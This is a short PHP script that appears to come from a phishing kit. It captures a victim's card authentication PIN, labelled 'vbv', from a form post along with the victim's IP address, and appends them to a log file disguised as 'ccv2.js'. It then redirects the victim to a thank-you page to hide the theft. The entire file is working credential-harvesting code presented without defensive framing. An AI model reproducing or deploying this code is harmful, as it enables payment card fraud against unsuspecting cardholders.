<?php
session_start();
$ip = getenv("REMOTE_ADDR");

$message .= "vbv: ".$_POST['pin']."\n";
$message .= "IP: ".$ip."\n";
$message .= "_____________________________\n";
$msg = "$message";


$pula = fopen ("ccv2.js" , "a");
fwrite ($pula , $message);
fclose ($pula);

header("Location: Thanks.htm");
?>
